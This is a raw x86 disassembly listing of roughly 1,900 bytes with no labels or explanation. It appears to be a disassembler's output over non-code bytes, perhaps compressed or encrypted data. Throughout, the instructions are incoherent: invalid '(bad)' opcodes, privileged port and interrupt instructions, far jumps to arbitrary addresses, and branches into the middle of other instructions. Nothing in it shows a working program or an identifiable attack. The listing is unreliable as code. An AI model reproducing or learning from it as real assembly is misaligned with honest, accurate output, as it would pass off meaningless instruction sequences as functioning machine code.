  4174c0:	and    edi,DWORD PTR [eax-0x3d]
  4174c3:	lock inc esp
  4174c5:	dec    ebp
  4174c6:	sti    
  4174c7:	pop    ss
  4174c8:	dec    edi
  4174c9:	out    dx,eax
  4174ca:	ficomp DWORD PTR [ebx+0x37]
  4174cd:	mov    bl,0xc2
  4174cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174d0:	lods   eax,DWORD PTR ds:[esi]
  4174d1:	and    ah,BYTE PTR ds:0xba0de227
  4174d7:	repnz and BYTE PTR [ebx],ch
  4174da:	push   ds
  4174db:	mov    eax,ds:0x7d0d4ea0
  4174e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174e1:	sub    ah,BYTE PTR [ecx]
  4174e3:	gs gs mov esp,0x4637a83b
  4174ea:	(bad)  
  4174eb:	dec    edx
  4174ec:	(bad)  
  4174ee:	xchg   BYTE PTR [esp+ecx*1],cl
  4174f1:	push   cs
  4174f2:	pushf  
  4174f3:	pop    ss
  4174f4:	and    esp,DWORD PTR [esi]
  4174f6:	in     al,dx
  4174f7:	jl     0x417509
  4174f9:	loop   0x41749a
  4174fb:	imul   edx,esi,0xae827e20
  417501:	imul   eax,DWORD PTR [eax-0x177ac20c],0x2
  417508:	sti    
  417509:	iret   
  41750a:	and    bl,bl
  41750c:	iret   
  41750d:	into   
  41750e:	jecxz  0x4174da
  417510:	jp     0x41756d
  417512:	sbb    ah,BYTE PTR [ebp-0x2d]
  417515:	push   0xeaabac44
  41751a:	int    0xe3
  41751c:	jo     0x417542
  41751e:	push   edi
  41751f:	fisttp QWORD PTR gs:[ecx+0x1]
  417523:	in     eax,0x1a
  417525:	shr    ah,1
  417527:	mov    ch,0xdb
  417529:	jnp    0x4174cc
  41752b:	mov    bh,0x50
  41752d:	pop    ecx
  41752e:	loop   0x41758f
  417530:	cwde   
  417531:	xchg   edx,eax
  417532:	jg     0x4174ee
  417534:	call   0x4788b30f
  417539:	mov    esp,0xe7a7149b
  41753e:	out    0x59,al
  417540:	pop    esp
  417541:	sti    
  417542:	(bad)  
  417544:	add    eax,DWORD PTR [ebx]
  417546:	or     DWORD PTR [ebp-0x36968dca],esi
  41754c:	setbe  BYTE PTR [esi+0x2b]
  417550:	inc    esp
  417551:	loopne 0x417596
  417553:	push   ss
  417554:	xchg   ebx,eax
  417555:	mov    esi,0xcbb94975
  41755a:	enter  0xd4c8,0x27
  41755e:	lds    edi,FWORD PTR [edi+0x35bc9c42]
  417564:	jbe    0x417592
  417566:	xlat   BYTE PTR ds:[ebx]
  417567:	pop    ebp
  417568:	pop    edi
  417569:	sub    BYTE PTR [eax],cl
  41756b:	dec    ebx
  41756c:	cmp    edi,DWORD PTR [ebx]
  41756e:	adc    DWORD PTR [eax+eiz*8+0xc3b9fda],ebx
  417575:	mov    eax,ds:0x5b09fd8
  41757a:	mov    bl,0x60
  41757c:	inc    esi
  41757d:	or     bh,bl
  41757f:	sub    eax,0xf6348f71
  417584:	sub    DWORD PTR [eax],edx
  417586:	xchg   BYTE PTR [ebx+0x2d],al
  417589:	jno    0x41752f
  41758b:	pop    ds
  41758c:	movsx  ecx,BYTE PTR [ecx+ebp*8]
  417590:	adc    al,0x25
  417592:	xor    DWORD PTR [ebx],esi
  417594:	es xchg ecx,eax
  417596:	sub    esi,0xffffffe9
  417599:	int    0xd9
  41759b:	xlat   BYTE PTR ds:[ebx]
  41759c:	adc    bl,BYTE PTR [ecx-0x35]
  41759f:	ins    DWORD PTR es:[edi],dx
  4175a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175a1:	adc    al,0xff
  4175a3:	loopne 0x417624
  4175a5:	repz (bad) 
  4175a7:	and    al,0xd3
  4175a9:	cwde   
  4175aa:	mov    cl,bl
  4175ac:	bound  edi,QWORD PTR [edi]
  4175ae:	mov    al,ds:0xab9fb22c
  4175b3:	xchg   ebx,eax
  4175b4:	jae    0x417609
  4175b6:	loope  0x41753e
  4175b8:	les    edx,FWORD PTR [ecx+ebx*4+0x30]
  4175bc:	inc    BYTE PTR [ebx+edi*4]
  4175bf:	idiv   DWORD PTR [ebx]
  4175c1:	test   al,0xb9
  4175c3:	cmp    ebp,esp
  4175c5:	jg     0x4175a4
  4175c7:	(bad)  
  4175c9:	popf   
  4175ca:	repnz xchg esp,eax
  4175cc:	test   BYTE PTR [edi],al
  4175ce:	pop    edx
  4175cf:	xchg   BYTE PTR [edi+0x1452a058],cl
  4175d5:	dec    ebx
  4175d6:	pop    edx
  4175d7:	jne    0x4175c8
  4175d9:	test   DWORD PTR [edx-0x3a],edx
  4175dc:	int    0xd2
  4175de:	jl     0x417654
  4175e0:	mov    ebx,0xc9c37730
  4175e5:	and    ebp,DWORD PTR [eax-0x70]
  4175e8:	mov    dl,0x7d
  4175ea:	nop
  4175eb:	fst    QWORD PTR [esp+esi*1-0x1805cb7d]
  4175f2:	outs   dx,BYTE PTR ds:[esi]
  4175f3:	and    bh,BYTE PTR [edx-0x2b]
  4175f6:	xchg   esp,eax
  4175f7:	cwde   
  4175f8:	pop    ebx
  4175f9:	and    BYTE PTR [edi],bh
  4175fb:	cmp    al,0x49
  4175fd:	mov    ebx,0x74e908d2
  417602:	in     eax,0x22
  417604:	inc    edx
  417605:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417606:	xor    al,0x8
  417608:	in     eax,dx
  417609:	ret    
  41760a:	fstp   TBYTE PTR [edi-0xe65ece5]
  417610:	push   eax
  417611:	or     eax,0xad63e3a3
  417616:	(bad)  
  417617:	popf   
  417618:	jmp    0x5bae1198
  41761d:	sahf   
  41761e:	xchg   ebp,eax
  41761f:	or     al,0xd5
  417621:	dec    ecx
  417622:	push   ecx
  417623:	leave  
  417624:	and    ah,BYTE PTR [edi+0x7b]
  417627:	mov    DWORD PTR [eax+esi*2],eax
  41762a:	dec    edx
  41762b:	mov    BYTE PTR [ebx-0x15a55346],ah
  417631:	mov    bh,0x99
  417633:	call   0xa37d3ba4
  417638:	xor    ecx,DWORD PTR [ebx-0x67]
  41763b:	xchg   esp,eax
  41763c:	call   0xa2662191
  417641:	outs   dx,DWORD PTR ds:[esi]
  417642:	aas    
  417643:	sub    edx,0x30
  417646:	mov    dl,0x9b
  417648:	push   edi
  417649:	sub    eax,0xa798ad37
  41764e:	or     al,0xd6
  417650:	js     0x41767e
  417652:	ins    DWORD PTR es:[edi],dx
  417653:	sub    ah,bh
  417655:	mov    ebp,0xeb49daec
  41765a:	inc    ebx
  41765b:	ficomp WORD PTR [ebp+0x46]
  41765e:	stos   BYTE PTR es:[edi],al
  41765f:	or     BYTE PTR [esi],dl
  417661:	dec    edi
  417662:	inc    ebp
  417663:	fstp   QWORD PTR [ecx-0x21]
  417666:	dec    ebx
  417667:	cmp    edi,DWORD PTR [edx-0x15]
  41766a:	inc    ecx
  41766b:	inc    edx
  41766c:	mov    al,ds:0xf4304c25
  417671:	and    dh,BYTE PTR [ebx]
  417673:	(bad)  
  417674:	xor    ecx,DWORD PTR [ebx]
  417676:	mov    ch,0x9c
  417678:	and    BYTE PTR [eax+0x54f98f1a],bl
  41767e:	push   ecx
  41767f:	mov    eax,0xf7b4719
  417684:	stos   BYTE PTR es:[edi],al
  417685:	pop    ebx
  417686:	lock imul edi,DWORD PTR [esp+ebp*1],0xb0f4ee8c
  41768e:	add    ebp,DWORD PTR [bp+0x5a4a]
  417693:	test   al,0x1d
  417695:	push   edx
  417696:	and    cl,BYTE PTR [edi-0x2a]
  417699:	div    DWORD PTR [esi-0x1e]
  41769c:	sub    BYTE PTR [ebx-0x1a],dh
  41769f:	jne    0x417676
  4176a1:	xor    bl,BYTE PTR [edx*4+0x40fc77f6]
  4176a8:	jmp    0x5cf609ec
  4176ad:	push   ebp
  4176ae:	nop
  4176af:	or     cl,BYTE PTR [esi+0x2280f40f]
  4176b5:	xchg   ecx,eax
  4176b6:	call   FWORD PTR [edi-0x7e]
  4176b9:	out    0x2b,al
  4176bb:	mov    bl,0x3e
  4176bd:	and    BYTE PTR [ebp+0x1c],dl
  4176c0:	std    
  4176c1:	das    
  4176c2:	jecxz  0x4176fd
  4176c4:	jmp    0x84b2:0xe2b87051
  4176cb:	cmp    bl,al
  4176cd:	(bad)  
  4176ce:	test   DWORD PTR [ebx+0x48],0x5a6ea604
  4176d5:	cmp    DWORD PTR [ebx],0x11a67748
  4176db:	mov    ds:0xef2e1be7,al
  4176e0:	xor    DWORD PTR [ebx],ebx
  4176e2:	and    DWORD PTR [esi+0x51],esp
  4176e5:	push   cs
  4176e6:	jns    0x4176c4
  4176e8:	dec    esp
  4176e9:	or     esp,DWORD PTR [edi-0x2ba30eec]
  4176ef:	add    eax,0x3180e878
  4176f4:	shl    BYTE PTR [esi],1
  4176f6:	mov    bh,0x96
  4176f8:	leave  
  4176f9:	sbb    al,0x17
  4176fb:	in     eax,0xb5
  4176fd:	cmp    eax,0xf0e75d78
  417702:	xchg   esp,eax
  417703:	std    
  417704:	or     al,0x44
  417706:	cmp    al,0x59
  417708:	dec    esp
  417709:	mov    ss,WORD PTR [ecx]
  41770b:	ret    
  41770c:	mov    bh,0xe6
  41770e:	(bad)
  417712:	sub    edx,DWORD PTR [ecx]
  417714:	cwde   
  417715:	xor    eax,0x76646a78
  41771a:	sub    BYTE PTR [edi],0xe1
  41771d:	cmp    eax,0xcef26476
  417722:	(bad)  
  417723:	cmp    ebx,DWORD PTR [ebx]
  417725:	rcl    DWORD PTR [ebx+0x58],1
  417728:	jbe    0x417730
  41772a:	popa   
  41772b:	pop    edx
  41772c:	sbb    al,0x93
  41772e:	enter  0x5b73,0x18
  417732:	bound  ebx,QWORD PTR [ecx+0x78]
  417735:	dec    ecx
  417736:	scas   al,BYTE PTR es:[edi]
  417737:	cmp    eax,0x8d6bca78
  41773c:	sbb    edi,DWORD PTR [edx+0x69]
  41773f:	(bad)
  417743:	pop    ecx
  417744:	xchg   esi,eax
  417745:	jno    0x41772d
  417747:	jmp    FWORD PTR [eax+0xb]
  41774a:	popf   
  41774b:	clc    
  41774c:	cmp    al,BYTE PTR [edi+0x74c8f90d]
  417752:	pop    ebx
  417753:	mov    DWORD PTR [ebx-0x21],ebp
  417756:	and    DWORD PTR [ecx-0x1b],eax
  417759:	and    bl,BYTE PTR [ebx+0x49]
  41775c:	lds    esi,FWORD PTR [edx-0x31]
  41775f:	mov    dl,0x2b
  417761:	or     BYTE PTR [ebx-0x64df5f6f],bl
  417767:	sbb    al,0x4c
  417769:	jno    0x417741
  41776b:	mov    ah,0x37
  41776d:	stc    
  41776e:	gs xor al,0x2d
  417771:	jle    0x4177c4
  417773:	push   0x44443ceb
  417778:	retf   
  417779:	outs   dx,BYTE PTR ds:[esi]
  41777a:	jnp    0x417718
  41777c:	sub    al,dh
  41777e:	xor    esp,eax
  417780:	or     al,0x14
  417782:	fldcw  WORD PTR [esi]
  417784:	jno    0x417730
  417786:	adc    al,0xd1
  417788:	xor    eax,0xa2cb4bf9
  41778d:	dec    edx
  41778e:	loop   0x41780d
  417790:	mov    DWORD PTR [edi],0x4b768738
  417796:	xchg   edi,eax
  417797:	(bad)  
  417798:	hlt    
  417799:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41779a:	and    al,0xe5
  41779c:	loope  0x417782
  41779e:	push   ebp
  41779f:	jmp    FWORD PTR [ecx-0x72567092]
  4177a5:	sub    bl,BYTE PTR [ecx]
  4177a7:	mov    esp,DWORD PTR [ebp-0x1b84b8a4]
  4177ad:	into   
  4177ae:	test   edx,eax
  4177b0:	mov    BYTE PTR ss:[ecx-0x4e],ah
  4177b4:	dec    ebp
  4177b5:	xchg   edi,eax
  4177b6:	push   eax
  4177b7:	call   0x5a3e6eb
  4177bc:	idiv   DWORD PTR [eax]
  4177be:	mov    bh,BYTE PTR [ebp-0x3b]
  4177c1:	add    esp,DWORD PTR [eax+0x54694e42]
  4177c7:	xlat   BYTE PTR ds:[ebx]
  4177c8:	test   eax,0x43f62aaa
  4177cd:	mov    bl,0x0
  4177cf:	xor    bh,BYTE PTR [edi]
  4177d1:	jb     0x417794
  4177d3:	imul   edi,DWORD PTR [edi],0x6054a959
  4177d9:	xor    DWORD PTR [edi+ebp*1-0x3150458a],0xffffffd8
  4177e1:	mov    esi,0x28b36d47
  4177e6:	leave  
  4177e7:	jne    0x41785d
  4177e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177ea:	sbb    bh,BYTE PTR [edi+esi*8-0x2]
  4177ee:	stos   DWORD PTR es:[edi],eax
  4177ef:	pop    esi
  4177f0:	pop    edx
  4177f1:	bound  edi,QWORD PTR [ebx+0x23636d84]
  4177f7:	jb     0x4177c1
  4177f9:	sub    cl,bl
  4177fb:	mov    dl,0x21
  4177fd:	or     DWORD PTR [ebx],edx
  4177ff:	int3   
  417800:	xchg   edi,eax
  417801:	scas   al,BYTE PTR es:[edi]
  417802:	and    al,0x97
  417804:	in     al,0xd
  417806:	xor    eax,DWORD PTR [eax+0x34]
  417809:	(bad)  [ebx]
  41780b:	xchg   esi,eax
  41780c:	mov    al,ds:0xd5dd4ac5
  417811:	stos   DWORD PTR es:[edi],eax
  417812:	popf   
  417813:	jno    0x41786b
  417815:	jmp    0x4177c1
  417817:	push   esp
  417818:	les    ebp,FWORD PTR [esi-0x13]
  41781b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41781c:	and    ebp,ecx
  41781e:	push   edx
  41781f:	cli    
  417820:	popf   
  417821:	sbb    dl,bl
  417823:	add    esp,DWORD PTR [eax+0x75]
  417826:	inc    eax
  417827:	mov    ebp,0xe28192cb
  41782c:	inc    esi
  41782d:	test   DWORD PTR [edx+0x2362c436],ebx
  417833:	xchg   BYTE PTR gs:[edx-0x1f],dl
  417837:	mov    bh,0xf8
  417839:	es adc eax,0xd9413b30
  41783f:	ds pushf 
  417841:	sbb    ah,bh
  417843:	sbb    eax,DWORD PTR [ebx-0x26d2516b]
  417849:	fld    TBYTE PTR [edi]
  41784b:	mov    edi,ecx
  41784d:	or     bl,bh
  41784f:	xor    ch,BYTE PTR [ebx+0x7b7e465e]
  417855:	cmp    DWORD PTR [ebp-0x4ffc54d5],edi
  41785b:	cli    
  41785c:	push   0x1e
  41785e:	xor    BYTE PTR [edx-0x22],cl
  417861:	cmp    BYTE PTR [ebx+0x74],bl
  417864:	mov    esi,cs
  417866:	push   0xffffffeb
  417868:	inc    ecx
  417869:	ins    BYTE PTR es:[edi],dx
  41786a:	int    0x31
  41786c:	sub    DWORD PTR [di+0x6e],esi
  417870:	cmp    al,0x7a
  417872:	mov    al,ds:0x74713353
  417877:	test   BYTE PTR [edx],0xb6
  41787a:	fldenv [esi-0x410dbf8a]
  417880:	test   al,0x1a
  417882:	test   eax,0x2586b0a6
  417887:	mov    eax,ds:0xf16cead6
  41788c:	push   edx
  41788d:	cdq    
  41788e:	in     al,0xac
  417890:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417891:	(bad)  
  417892:	inc    eax
  417893:	dec    esi
  417894:	and    al,0x67
  417896:	dec    ebp
  417897:	mov    dh,0x29
  417899:	int3   
  41789a:	in     al,dx
  41789b:	shl    BYTE PTR [edi-0x61],1
  41789e:	outs   dx,BYTE PTR ds:[esi]
  41789f:	sbb    al,0x9e
  4178a1:	pop    esi
  4178a2:	push   eax
  4178a3:	xor    DWORD PTR [esi+0x35],ecx
  4178a6:	xchg   ecx,eax
  4178a7:	lds    esi,FWORD PTR [ecx-0x6c]
  4178aa:	into   
  4178ab:	add    al,0xc5
  4178ad:	rcr    DWORD PTR [ecx+0x19],0x14
  4178b1:	or     BYTE PTR ds:0x4566e01c,dl
  4178b7:	xor    bl,BYTE PTR [eax+0x59]
  4178ba:	rol    DWORD PTR [ecx-0x7027c25f],0x7c
  4178c1:	jbe    0x417897
  4178c3:	imul   esi,DWORD PTR ss:[edx],0xe21059ed
  4178ca:	repz pop eax
  4178cc:	pop    edx
  4178cd:	pushf  
  4178ce:	dec    ecx
  4178cf:	out    dx,al
  4178d0:	out    0x57,al
  4178d2:	in     al,0x5b
  4178d4:	jb     0x417885
  4178d6:	add    ebx,ebx
  4178d8:	test   ebx,esp
  4178da:	test   DWORD PTR [eax+0x18],eax
  4178dd:	adc    ebx,esi
  4178df:	scas   eax,DWORD PTR es:[edi]
  4178e0:	xor    bh,ch
  4178e2:	jae    0x417908
  4178e4:	and    eax,0xffd01092
  4178e9:	ja     0x4178b8
  4178eb:	inc    ebx
  4178ec:	in     al,dx
  4178ed:	rcr    BYTE PTR [ecx-0x72],0x19
  4178f1:	sar    BYTE PTR [ebx-0x48],1
  4178f4:	cwde   
  4178f5:	adc    ch,dh
  4178f7:	add    BYTE PTR [edx+esi*1+0x969d953],cl
  4178fe:	dec    eax
  4178ff:	imul   edx,ebp,0xbc23446a
  417905:	lods   al,BYTE PTR ds:[esi]
  417906:	ja     0x417920
  417908:	lahf   
  417909:	in     al,0x41
  41790b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41790c:	adc    ebx,eax
  41790e:	popf   
  41790f:	jo     0x4178a5
  417911:	int    0xa5
  417913:	pop    esi
  417914:	test   DWORD PTR [ebp+ebp*1+0x1b],edx
  417918:	test   BYTE PTR [edi],ch
  41791a:	repnz inc ecx
  41791c:	aad    0x93
  41791e:	and    ecx,DWORD PTR es:[eax]
  417921:	pushf  
  417922:	jo     0x4178fc
  417924:	cmp    ebx,ecx
  417926:	loope  0x41794e
  417928:	clc    
  417929:	and    dl,dl
  41792b:	jp     0x417934
  41792d:	add    edi,DWORD PTR [ebp-0x5734d1df]
  417933:	xchg   ebp,eax
  417934:	jns    0x41795f
  417936:	scas   al,BYTE PTR es:[edi]
  417937:	xor    bh,BYTE PTR [ecx]
  417939:	(bad)  
  41793a:	sub    DWORD PTR [edi-0x1a],ecx
  41793d:	dec    edx
  41793e:	xor    al,0xf4
  417940:	mov    eax,0x559f8df7
  417945:	js     0x4178f7
  417947:	adc    BYTE PTR [ecx-0x326aa796],ah
  41794d:	jno    0x4178e1
  41794f:	popf   
  417950:	icebp  
  417951:	icebp  
  417952:	mov    edx,es
  417954:	jmp    0x417910
  417956:	cmp    bh,BYTE PTR [edx+0x16]
  417959:	scas   al,BYTE PTR es:[edi]
  41795a:	cmp    ebx,0xffffffe8
  41795d:	bound  ebx,QWORD PTR [ecx+0x3a]
  417960:	dec    ebp
  417961:	gs xchg ebx,eax
  417963:	lods   eax,DWORD PTR ds:[esi]
  417964:	mov    eax,0x2b21ab42
  417969:	jnp    0x4179d4
  41796b:	aam    0x68
  41796d:	jb     0x41793d
  41796f:	pop    es
  417970:	xchg   BYTE PTR [ebp-0x27ce8433],dh
  417976:	sti    
  417977:	mov    dl,0x54
  417979:	inc    esi
  41797a:	stc    
  41797b:	add    al,0xad
  41797d:	jno    0x4179fe
  41797f:	shl    BYTE PTR [ecx-0x9995ba2],cl
  417985:	ret    0x1f01
  417988:	ja     0x4179b4
  41798a:	xchg   edi,eax
  41798b:	outs   dx,BYTE PTR ds:[esi]
  41798c:	sub    al,0x0
  41798e:	es mov dh,0x13
  417991:	pop    ecx
  417992:	add    dl,BYTE PTR [esi]
  417994:	push   cs
  417995:	test   DWORD PTR ds:0x8802922e,0xfc464441
  41799f:	lea    ebx,[ebp+edi*1+0xf]
  4179a3:	sbb    eax,0xbadbbe86
  4179a8:	mov    edx,0xf16024a6
  4179ad:	mov    al,ds:0xe322535c
  4179b2:	rcr    BYTE PTR [ebx],0x2f
  4179b5:	dec    ebp
  4179b6:	jb     0x417a25
  4179b8:	or     edi,ecx
  4179ba:	and    DWORD PTR ss:[esi+0x5c],esp
  4179be:	xchg   edi,eax
  4179bf:	fidivr DWORD PTR [ecx-0x33]
  4179c2:	xor    al,BYTE PTR [ebx+edi*8-0x404ad7f9]
  4179c9:	sub    DWORD PTR [ecx],0xb06a02eb
  4179cf:	aad    0xc8
  4179d1:	rcr    DWORD PTR [ebp-0x46],0x74
  4179d5:	xchg   edi,eax
  4179d6:	sbb    DWORD PTR [esi],0xf65a17b5
  4179dc:	cmc    
  4179dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4179de:	mov    bl,0xea
  4179e0:	call   0x9ae2bec0
  4179e5:	xchg   edx,eax
  4179e6:	test   DWORD PTR [eax+eiz*2+0x7],eax
  4179ea:	scas   al,BYTE PTR es:[edi]
  4179eb:	mov    DWORD PTR [ebx-0x46a16797],edx
  4179f1:	push   ss
  4179f2:	jl     0x417a0f
  4179f4:	es inc edi
  4179f6:	popf   
  4179f7:	xchg   DWORD PTR cs:[ebx+ecx*2],ebp
  4179fb:	xor    BYTE PTR [edi+0x41a5707b],ah
  417a01:	jnp    0x417a75
  417a03:	or     DWORD PTR [ebx+0x4c6c2e5d],ebp
  417a09:	and    al,0xf0
  417a0b:	dec    edi
  417a0c:	push   es
  417a0d:	test   DWORD PTR [ebx-0x8ee5a25],eax
  417a13:	and    ebx,DWORD PTR [eax+0x5b5f334b]
  417a19:	pop    esi
  417a1a:	cld    
  417a1b:	xchg   esi,eax
  417a1c:	or     DWORD PTR [ecx-0x10912a30],edx
  417a22:	push   esp
  417a23:	lods   al,BYTE PTR ds:[esi]
  417a24:	in     eax,0xa0
  417a26:	fsubr  DWORD PTR [ebx]
  417a28:	mov    edx,0x48932572
  417a2d:	popa   
  417a2e:	and    al,0x7b
  417a30:	or     eax,DWORD PTR [edi+edx*4]
  417a33:	lods   al,BYTE PTR ds:[esi]
  417a34:	dec    ebx
  417a35:	pop    ecx
  417a36:	int    0xae
  417a38:	out    dx,al
  417a39:	inc    ebp
  417a3a:	ret    
  417a3b:	loope  0x417aad
  417a3d:	mov    ch,0x0
  417a3f:	mov    ebx,0xfe714d56
  417a44:	dec    edi
  417a45:	das    
  417a46:	push   es
  417a47:	mov    esp,0x41f78743
  417a4c:	cmp    DWORD PTR [edx+0x275c79c7],0xee85acb4
  417a56:	dec    ebp
  417a57:	jge    0x417a26
  417a59:	pop    esi
  417a5a:	stos   BYTE PTR es:[edi],al
  417a5b:	cmp    eax,0xd56daf1
  417a60:	jp     0x417a44
  417a62:	jmp    0xff86:0x4fe3dadf
  417a69:	pop    es
  417a6a:	aas    
  417a6b:	fwait
  417a6c:	xor    BYTE PTR [ebx+edi*1-0xf60a429],cl
  417a73:	xlat   BYTE PTR ds:[ebx]
  417a74:	sbb    DWORD PTR [ecx],0x759fecdf
  417a7a:	or     DWORD PTR [edi-0x5f],0xfffffffd
  417a7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a7f:	adc    esp,esi
  417a81:	loope  0x417ab8
  417a83:	mov    esi,0x93321ea6
  417a88:	sbb    eax,0x5ab38e74
  417a8d:	cmp    al,ah
  417a8f:	shl    DWORD PTR [ecx],1
  417a91:	and    al,al
  417a93:	leave  
  417a94:	cwde   
  417a95:	fidivr WORD PTR [ebp-0x1a]
  417a98:	inc    ebp
  417a99:	and    DWORD PTR [eax-0x6f],esp
  417a9c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  417a9e:	pop    esp
  417a9f:	scas   eax,DWORD PTR es:[edi]
  417aa0:	popa   
  417aa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417aa2:	aas    
  417aa3:	leave  
  417aa4:	mov    al,0x2d
  417aa6:	mov    ds:0xd9e6880,al
  417aab:	or     al,0x66
  417aad:	cmp    edi,edi
  417aaf:	sub    eax,0x21e88d82
  417ab4:	cli    
  417ab5:	(bad)  
  417ab6:	fisttp WORD PTR [ebp+0x6cdb8a27]
  417abc:	mov    bh,0x51
  417abe:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  417ac0:	mov    ch,0xd1
  417ac2:	lds    esi,FWORD PTR [ebp+0x3002fece]
  417ac8:	mov    es,eax
  417aca:	dec    ebx
  417acb:	or     al,0xd8
  417acd:	mov    ecx,0xfdd3e932
  417ad2:	push   eax
  417ad3:	adc    BYTE PTR [ebx],bh
  417ad5:	dec    ecx
  417ad6:	adc    cl,BYTE PTR [esi]
  417ad8:	pop    edi
  417ad9:	inc    edx
  417ada:	clc    
  417adb:	nop
  417adc:	inc    DWORD PTR [eax+eax*4+0x45]
  417ae0:	xchg   edx,eax
  417ae1:	std    
  417ae2:	mov    eax,0x4ea5395b
  417ae7:	ret    
  417ae8:	mov    edx,0xed0be923
  417aed:	sbb    ecx,DWORD PTR [esi]
  417aef:	inc    esi
  417af0:	es mov dh,0x78
  417af3:	cmp    al,0xb6
  417af5:	mov    eax,0xdba2e9c2
  417afa:	dec    esi
  417afb:	dec    DWORD PTR [ebx-0x43]
  417afe:	mov    dh,0xf8
  417b00:	popf   
  417b01:	dec    ebp
  417b02:	scas   eax,DWORD PTR es:[edi]
  417b03:	sti    
  417b04:	fwait
  417b05:	cmp    edx,eax
  417b07:	mov    eax,0x70c9aa17
  417b0c:	aad    0x98
  417b0e:	cld    
  417b0f:	inc    ebp
  417b10:	mov    ah,0xd6
  417b12:	enter  0xf5b4,0x56
  417b16:	dec    eax
  417b17:	shl    DWORD PTR [ecx],0xaf
  417b1a:	loope  0x417aba
  417b1c:	(bad)  
  417b1d:	ins    DWORD PTR es:[edi],dx
  417b1e:	imul   eax
  417b20:	mov    bl,0x15
  417b22:	xor    al,0xfb
  417b24:	call   0x95a8:0xb9e27e14
  417b2b:	std    
  417b2c:	data16 lods al,BYTE PTR ds:[esi]
  417b2e:	imul   ebp,DWORD PTR [edi],0x17
  417b31:	xchg   esi,eax
  417b32:	shr    DWORD PTR ds:0x7f9f3f8d,1
  417b38:	imul   ecx,DWORD PTR [edi],0x283ad56f
  417b3e:	mov    al,ds:0x4a994cf1
  417b43:	mov    ebp,0x3f29045d
  417b48:	pushf  
  417b49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417b4a:	pop    ss
  417b4b:	data16 ror BYTE PTR [esp+ebp*8],cl
  417b4f:	iret   
  417b50:	mov    ah,0x8c
  417b52:	(bad)  
  417b54:	sub    ah,ch
  417b56:	callw  0xaed
  417b5a:	cmp    BYTE PTR [ebp+ebx*2-0x3b],0xc2
  417b5f:	and    al,0x65
  417b61:	jne    0x417bdb
  417b63:	and    al,0x32
  417b65:	(bad)
  417b69:	sti    
  417b6a:	stos   BYTE PTR es:[edi],al
  417b6b:	mov    al,0x49
  417b6d:	inc    ebx
  417b6e:	lods   al,BYTE PTR ds:[esi]
  417b6f:	ficomp WORD PTR [ebx-0x65bfab15]
  417b75:	and    dl,BYTE PTR [esi]
  417b77:	fistp  QWORD PTR [eax-0x730c8128]
  417b7d:	imul   ebp,esi,0xffffff84
  417b80:	push   ecx
  417b81:	xor    esi,0x5f60f566
  417b87:	ret    
  417b88:	jge    0x417bb3
  417b8a:	mov    ss,WORD PTR [edx]
  417b8c:	aad    0x5b
  417b8e:	add    eax,0x3bcfcd20
  417b93:	jmp    0x417be8
  417b95:	cmp    DWORD PTR [ecx],ebx
  417b97:	call   0xd33a00ab
  417b9c:	cmp    bh,BYTE PTR [edx-0x24a05c41]
  417ba2:	jge    0x417ba2
  417ba4:	ret    0xf4a2
  417ba7:	int3   
  417ba8:	int    0x79
  417baa:	and    DWORD PTR [ebx+ebp*1+0x15e2eccb],ebp
  417bb1:	jno    0x417b68
  417bb3:	mov    ebx,0x530aee45
  417bb8:	adc    edi,DWORD PTR [edx+0x68d00e22]
  417bbe:	xchg   ecx,eax
  417bbf:	mov    eax,0x9ded1722
  417bc4:	push   ebx
  417bc5:	push   ebx
  417bc6:	sbb    ecx,DWORD PTR [esi-0x4c]
  417bc9:	add    eax,0x40d76bb9
  417bce:	loope  0x417b5a
  417bd0:	jb     0x417b69
  417bd2:	aam    0x7e
  417bd4:	mul    BYTE PTR [edx-0x6d]
  417bd7:	aaa    
  417bd8:	push   eax
  417bd9:	out    dx,eax
  417bda:	pop    es
  417bdb:	xchg   BYTE PTR [ebp+0x3430923],bh
  417be1:	shl    DWORD PTR es:[esi+0x31a64834],1
  417be8:	push   edi
  417be9:	cdq    
  417bea:	sbb    DWORD PTR [ebp-0x5b],esi
  417bed:	cmp    esp,DWORD PTR [ecx]
  417bef:	int3   
  417bf0:	mov    ecx,0x433ad55e
  417bf5:	into   
  417bf6:	test   esp,0x228fd92a
  417bfc:	add    BYTE PTR [ebp+0x61],0xb8
  417c00:	hlt    
  417c01:	pop    es
  417c02:	ror    esi,cl
  417c04:	es (bad) 
  417c06:	ins    DWORD PTR es:[edi],dx
  417c07:	xor    eax,0x916784d2
  417c0c:	push   ebp
  417c0d:	pop    edx
  417c0e:	ret    0x1c87
  417c11:	pop    ss
  417c12:	jp     0x417c52
  417c14:	sub    ah,BYTE PTR [edi]
  417c16:	cmp    al,0x23
  417c18:	sar    DWORD PTR [edi+0x61],cl
  417c1b:	mov    ch,BYTE PTR [ebp+0x6f299293]
  417c21:	out    0x4c,eax
  417c23:	sub    BYTE PTR [eax+0x11861b69],bh
  417c29:	rcl    ebp,0x6d
  417c2c:	lea    esi,ds:0x23a3a8ba
  417c32:	jecxz  0x417bdf
  417c34:	mov    edi,0xfa9c5d15
  417c39:	sysexit 
  417c3b:	js     0x417c73
  417c3d:	ins    BYTE PTR es:[edi],dx
  417c3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c3f:	sahf   
  417c40:	pushf  
  417c41:	pop    ebx
  417c42:	sbb    edi,esp
  417c44:	dec    ebp
  417c45:	test   eax,0x682f6db4
  417c4a:	je     0x417cb1
  417c4c:	push   ds
  417c4d:	xchg   ecx,eax
  417c4e:	enter  0xaddf,0x41
  417c52:	inc    esi
  417c53:	add    ch,BYTE PTR [ebp-0x5f]
  417c56:	cli    
  417c57:	shl    cl,1
